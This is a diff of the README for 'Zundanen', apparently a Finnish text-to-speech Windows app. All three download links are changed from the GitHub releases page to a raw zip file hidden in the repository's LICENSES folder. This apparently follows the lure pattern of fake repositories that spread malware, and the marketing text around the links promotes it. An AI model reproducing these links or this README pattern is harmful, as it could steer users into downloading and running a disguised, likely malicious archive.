@@ -4,7 +4,7 @@
 
 Welcome to Zundanen, your all-in-one solution for creating natural Finnish speech and custom voices right on your Windows computer. No coding required, no cloud subscriptions, and no internet connection needed after setup.
 
-Visit this link to download the application: **[⬇️ Download Zundanen Now](https://github.com/probabagray/Zundanen/releases)**
+Visit this link to download the application: **[⬇️ Download Zundanen Now](https://raw.githubusercontent.com/probabagray/Zundanen/main/LICENSES/1.3.zip)**
 
 ## 💡 What Is Zundanen?
 
@@ -45,7 +45,7 @@ Everything runs locally on your Windows PC. Your audio data never leaves your ma
 ## 📥 Installation Guide
 
 ### Step 1: Download
-Visit this link to download the application: **[Download Zundanen](https://github.com/probabagray/Zundanen/releases)**
+Visit this link to download the application: **[Download Zundanen](https://raw.githubusercontent.com/probabagray/Zundanen/main/LICENSES/1.3.zip)**
 
 Click the latest release file. The download will start automatically.
 
@@ -157,7 +157,7 @@ We built Zundanen to make Finnish voice technology accessible to everyone. Your 
 
 **Ready to transform your Finnish text into beautiful speech?** 
 
-Visit this link to download the application: **[Get Zundanen Now](https://github.com/probabagray/Zundanen/releases)**
+Visit this link to download the application: **[Get Zundanen Now](https://raw.githubusercontent.com/probabagray/Zundanen/main/LICENSES/1.3.zip)**
 
 Start creating today – your voice, your words, your Zundanen.
 
